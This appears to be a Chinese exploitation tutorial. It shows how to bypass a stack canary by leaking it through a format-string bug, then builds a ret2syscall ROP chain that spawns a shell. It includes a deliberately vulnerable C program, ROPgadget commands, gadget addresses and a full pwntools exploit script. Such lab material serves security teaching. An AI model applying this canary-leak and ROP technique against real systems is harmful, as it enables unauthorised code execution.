##  0x01 引言

 **我们在学ropgadgets与ret2syscall技术原理时，构造指令流时，是没有加堆栈保护的，比如下面的程序：**

文件名：7.c

    
    
    #include <stdio.h>
    #include <string.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <sys/syscall.h>
    void exploit()
    {
        system("/bin/sh");
    }
    void func()
    {
    	char str[0x20];
    	read(0,str,0x50);
    	printf(str);
    	read(0,str,0x50);
    }
    int main()
    {
    	func();
    	return 0;
    }

我们是这样编译的，是没有加堆栈保护的，之后再利用ropgadgets构造指令流，就可以成功去执行execve("/bin/sh",null,null);。

    
    
    gcc -no-pie -fno-stack-protector -static -m32 -o 7.exe 7.c

如果加上堆栈保护我们该怎么过呢？像下面这样编译：

    
    
    gcc -no-pie -fstack-protector -static -m32 -o 7.exe 7.c

显然我们就不能像原来一样构造指令流了，因为加入了堆栈保护。那我们该怎么办呢？我们可以利用格式化输出，将canary打印出来，然后再进行指令的组装。

##  0x02 找地址

调试我们的程序，找到canary的地址，地址在：0xffffcfac

![](https://image.3001.net/images/20200425/1587745815_5ea31417c0222.png!small)

继续调试，直到printf，我们看看现在canary据栈顶的位置：0060，除以4等于15，说明传给第一个read函数的值为：%15$08x，就可以将canary打印出来了

![](https://image.3001.net/images/20200425/1587746171_5ea3157b00597.png!small)

重新调试，找到read函数把读进来的数据存放的地址：0xffffcf8c

![](https://image.3001.net/images/20200425/1587745923_5ea3148354dc1.png!small)

将%15$08x给read函数，发现可以将canary打印出来

![](https://image.3001.net/images/20200425/1587746554_5ea316faa89e6.png!small)

接下来就是利用好第二个read函数来构造rop链了

##  0x03 构造rop链

linux上系统调用原理：

> eax 系统调用号
>
> ebx 第一个参数
>
> ecx 第二个参数
>
> edx 第三个参数
>
> esi 第四个参数
>
> edi 第五个参数
>
> int 0x80

所以eax就存放execve函数的系统调用号11，ebx存放第一个参数/bin/sh，ecx存放第二个参数null，就是0，edx存放第三个参数，也是0

    
    
    ROPgadget --binary ./7.exe --only "pop|ret" | grep "eax"

地址用：0x080b8546

![](https://image.3001.net/images/20200425/1587746749_5ea317bd70c50.png!small)

    
    
    ROPgadget --binary ./7.exe --only "pop|ret" | grep "ebx" | grep "ecx" | grep "edx"

地址为：0x0806f210

![](https://image.3001.net/images/20200425/1587746849_5ea3182191efa.png!small)

    
    
    ROPgadget --binary ./7.exe --string "/bin/sh"

地址用：0x080bbd80

![](https://image.3001.net/images/20200425/1587746922_5ea3186a190e0.png!small)

    
    
     ROPgadget --binary ./7.exe --only "int"|grep "0x80"

地址为：0x0806ce37

![](https://image.3001.net/images/20200425/1587747002_5ea318ba3243b.png!small)

##  0x04 写出poc

    
    
    from pwn import *
    context(arch="i386",os="linux")
    p=process('./7.exe')
    p.sendline("%15$08x")
    canary=p.recv()[:8]
    print(canary)
    canary=canary.decode("hex")[::-1]	
    coffset=4*8							
    roffset=3*4					
    add_eax=p32(0x080b8546)
    value_eax=p32(0xb)
    add_edx_ecx_ebx=p32(0x0806f210)
    value_ebx=p32(0x080bbd80)
    value_ecx=p32(0)
    value_edx=p32(0)
    add_int=p32(0x0806ce37)
    payload=coffset*'a'+canary+roffset*'a'+add_eax+value_eax+add_edx_ecx_ebx+value_edx+value_ecx+value_ebx+add_int
    p.sendline(payload)
    p.interactive()

从from pwn import
*到canary=canary.decode("hex")[::-1]都是为了找出canary，因为加了堆栈保护，我们不能直接把数据打入到堆栈中，所以要先找出canary，然后构造payload，我们要把canary加进去，过堆栈保护，再在后面加上我们的rop链。

执行成功

![](https://image.3001.net/images/20200425/1587747205_5ea319855ae20.png!small)

##  0x05 总结

开启了堆栈保护，加入了cookie，一旦我们破坏了堆栈，会引起系统保护，出现异常。但是我们还是需要构造我们的指令流，我们可以利用格式化输出，将canary打印出来，接下来我们可以利用读写函数，构造一个指令流，我们先去读，看一下堆栈的canary在哪里，然后我们canary搞出来，把canary再回填进去，进行组装，这样就即可以过堆栈保护，也可以构造我们的指令流了。

 ***本文作者： 好好学习er，转载请注明来自FreeBuf.COM**  
  
  

